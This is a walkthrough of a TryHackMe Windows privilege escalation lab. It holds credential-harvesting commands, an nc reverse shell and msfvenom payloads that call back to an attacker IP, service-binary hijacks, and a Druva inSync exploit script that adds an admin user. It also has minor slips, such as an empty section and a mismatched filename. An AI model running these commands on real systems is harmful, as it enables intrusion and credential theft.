![Windows Privilege Escalation Banner](windowsprivesc20/Windows_Privilege_Escalation_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Cover.png" alt="Windows Privilege Escalation Logo">
</p>

# Windows Privilege Escalation

This guide contains the answer and steps necessary to get to them for the [Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20) room.

## Table of contents

- [Windows Privilege Escalation](#windows-privilege-escalation)
- [Harvesting Passwords from Usual Spots](#harvesting-passwords-from-usual-spots)
- [Other Quick Wins](#other-quick-wins)
- [Abusing Service Misconfigurations](#abusing-service-misconfigurations)
- [Abusing dangerous privileges](#abusing-dangerous-privileges)
- [Abusing vulnerable software](#abusing-vulnerable-software)
- [Tools of the Trade ](#tools-of-the-trade)

### Windows Privilege Escalation

1. Users that can change system configurations are part of which group?

   This answer can be found in the text.

   ><details><summary>Click for answer</summary>Administrators</details>

2. The SYSTEM account has more privileges than the Administrator user (aye/nay)

   This answer can be found in the text.

   ><details><summary>Click for answer</summary>aye</details>

### Harvesting Passwords from Usual Spots

1. A password for the julia.jones user has been left on the Powershell history. What is the password?

   We can use the following cmd command to list the powershell history.

   ```cmd
   type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
   ```

   HARVESTING POWERHSELL

   ><details><summary>Click for answer</summary>ZuperCkretPa5z</details>

2. A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?

   First we open the config file located at: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`. We then look for any mentions of the account `db_admin`.

   HARVESTING IIS

   ><details><summary>Click for answer</summary>098n0x35skjD3</details>

2. There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.

   Looking through the stored credentials, we can see mikes credentials are indeed on the system.

   ```cmd
   cmdkey /list
   ```

   HARVESTING CREDS

   Now we can spawn a shell under this user and view the flag.

   ```cmd
   runas /savecred /user:admin cmd.exe
   ```

   HARVESTING FLAG
   
   ><details><summary>Click for answer</summary>THM{WHAT_IS_MY_PASSWORD}/details>

4. Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?

   We can use the following command to view stored credentials in Putty.

   ```cmd
   reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
   ```

   HARVESTING PUTTY

   ><details><summary>Click for answer</summary>CoolPass2021</details>

### Other Quick Wins

1. What is the taskusr1 flag?

   First we query the task scheduler to find more information on the misconfigured task.

   ```cmd
   schtasks /query /tn vulntask /fo list /v
   ```

   QUICK TASK

   Using `icacls` we can see the permission we have to modify this file. Looks like we can edit it.

   ```cmd
   icacls C:\tasks\schtask.bat
   ```
   
   QUICK PERMISSIONS

   Now lets edit the bat file to execute our reverse shell.

   ```cmd
   echo C:\Tools\nc64.exe -e cmd.exe 10.18.78.136 1337 > C:\tasks\schtask.bat
   ```

   QUICK SCRIPT

   Last thing to do, is set up our listener and run the task manually.

   ```cmd
   nc -nlvp 1337

   schtasks /run /tn vulntask
   ```
   
   QUICK REVERSE SHELL

   Now we can navigate to the users desktop and read the flag.

   QUICK FLAG

   ><details><summary>Click for answer</summary>THM{TASK_COMPLETED}</details>

### Abusing Service Misconfigurations

1. Get the flag on svcusr1's desktop.

   Lets first query the service configuration and see if we have permission to modify the executable.

   ```cmd
   sc qc WindowsScheduler

   icacls C:\PROGRA~2\SYSTEM~1\WService.exe
   ```

   SERVICES PERMISSIONS

   Looks like we can. Now we can make our reverse payload with msfvenom.

   ```cmd
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f exe-service -o rev-svc.exe

   python3 -m http.server 8080

   nc -nlvp 1337
   ```

   After setting up our http server and listener we can use powershell on the target system to transfer the file.

   ```cmd
   wget 10.18.78.136:8080/rev-svc.exe -o rev-svc.exe
   ```

   Now we can create a backup of the original executabel and copy our own into the folder.

   ```cmd
   move WService.exe WService.exe.bkp

   move C:\Users\thm-unpriv\rev-svc.exe WService.exe

   icacls WService.exe /grant Everyone:F
   ```

   SERVICES MOVE FILE
   
   The last thing to do, is stopping the service and then restarting it.

   ```cmd
   sc stop windowsscheduler
   
   sc start windowsscheduler
   ```

   SERVICES CONNECTION
   
   Now we can look for the flag on the users desktop.

   SERVICES FLAG1

   ><details><summary>Click for answer</summary>THM{AT_YOUR_SERVICE}</details>

2. Get the flag on svcusr2's desktop.

   We will first check the the permissions for the installation path for the "disk sorter enterprise" service.

   ```cmd
   sc qc "disk sorter enterprise"

   icacls C:\MyPrograms
   ```

   ![Services Quotes Service](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Quotes_Service.png)

   Now we can create another reverse shell to use. Then we transfer it over to the target system and move in to the correct folder. Lastly, we must give everyone permission to use the file.

   ```cmd
   msfvenom -p windows/x64/shell_reverse_tcp lhost=10.18.78.136 lport=1337 -f exe-service -o rev-svc2.exe

   python3 -m http.server 8080

   wget 10.18.78.136:8080/rev-svc2.exe -o rev-svc2.exe

   move C:\Users\thm-unpriv\rev-svc2.exe Disk.exe

   icacls C:\MyPrograms\Disk.exe /grant Everyone:F
   ```
   
   Then we set up our listener and stop/start the service to receive a connection.

   ```cmd
   nc -nlvp 1337

   sc stop "disk sorter enterprise"

   sc start "disk sorter enterprise"
   ```
   
   ![Services Quotes Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Quotes_Connection.png)

   Now, we only have to look for and read the flag.

   ![Services Quotes Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Quotes_Flag.png)

   ><details><summary>Click for answer</summary>THM{QUOTES_EVERYWHERE}</details>

3. Get the flag on the Administrator's desktop.

   First we check the permission for the service DACL configuration using Sysinternals suite.

   ```cmd
   C:\tools\AccessChk>accesschk64.exe -qlc thmservice
   ```

   ![Services Config Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Config_Permissions.png)
   
   Looks like we (BUILTIN\Users) have permission (SERVICE_ALL_ACCESS) to change the configuration.
   
   ```cmd
   sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
   ```
   
   Now we can create another reverse shell to use. Then we transfer it over to the target system and move in to the correct folder. Lastly, we must give everyone permission to use the file.

   ```cmd
   msfvenom -p windows/x64/shell_reverse_tcp lhost=10.18.78.136 lport=1337 -f exe-service -o rev-svc3.exe

   python3 -m http.server 8080

   wget 10.18.78.136:8080/rev-svc2.exe -o rev-svc3.exe

   icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
   ```

   Then we set up our listener and stop/start the service to receive a connection.
   
   ```cmd
   nc -nlvp 1337

   sc stop "thmservice"

   sc start "thmservice"
   ```
   
   ![Services Config Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Config_Connection.png)
   
   Now, we only have to look for and read the flag.
   
   ![Services Config Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Config_Flag.png)
   
   ><details><summary>Click for answer</summary>THM{INSECURE_SVC_CONFIG}</details>

### Abusing dangerous privileges

1. Get the flag on the Administrator's desktop.



   ><details><summary>Click for answer</summary></details>
   
### Abusing vulnerable software

1. Get the flag on the Administrator's desktop.

We first use wmic to see which programs are installed. Then we can investigate which one we can abuse.

   ```cmd
   wmic product get name,version,vendor
   ```

   ![Software Programs](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Software_Programs.png)

   In this exercise we use the vulnerable Druva InSync. We will modify the provided exploit to add the `pwnd` user to the administrators group.

   ```ps
   $ErrorActionPreference = "Stop"

   $cmd = "net user pwnd /add & net localgroup administrators pwnd /add"

   $s = New-Object System.Net.Sockets.Socket(
       [System.Net.Sockets.AddressFamily]::InterNetwork,
       [System.Net.Sockets.SocketType]::Stream,
       [System.Net.Sockets.ProtocolType]::Tcp
   )
   $s.Connect("127.0.0.1", 6064)

   $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
   $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
   $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
   $length = [System.BitConverter]::GetBytes($command.Length);

   $s.Send($header)
   $s.Send($rpcType)
   $s.Send($length)
   $s.Send($command)
   ```

   Remember to save this file as `.ps1`. Now we can run this script using powershell.

   ```ps
   .\letmein.ps1
   ```

   We can check if this has worked by looking up the user.

   ```cmd
   net user pwnd
   ```
   
   ![Software User](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Software_User.png)
   
   To get to the flag, we should open a command prompt as adminstrator. When asked for credentials, we choose pwnd and can leave the password blank (as we didn't specify any).

   ![Software Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Software_Flag.png)

   ><details><summary>Click for answer</summary>THM{EZ_DLL_PROXY_4ME}</details>
